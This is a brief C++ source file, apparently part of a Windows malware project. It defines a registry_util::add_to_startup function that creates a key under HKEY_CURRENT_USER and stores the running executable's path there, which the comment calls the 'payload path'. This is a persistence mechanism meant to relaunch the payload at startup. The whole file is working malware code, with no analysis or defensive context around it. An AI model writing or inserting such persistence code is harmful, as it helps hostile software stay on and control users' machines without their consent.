#include "registry.hpp"
#include "constants.hpp"
#include <Windows.h>

// Creates a registry entry and sets its value to the current payload path.
void registry_util::add_to_startup() noexcept {
	HKEY hkey;
	const auto err = RegCreateKeyEx(HKEY_CURRENT_USER, constants::lp_sub_key, 0, NULL,
		REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkey, NULL);

	if (!err) {
		WCHAR executable_path[MAX_PATH];
		GetModuleFileName(NULL, executable_path, MAX_PATH);

		RegSetValueEx(hkey, NULL, 0, REG_SZ, reinterpret_cast<BYTE*>(executable_path), MAX_PATH);
		RegCloseKey(hkey);
	}
}
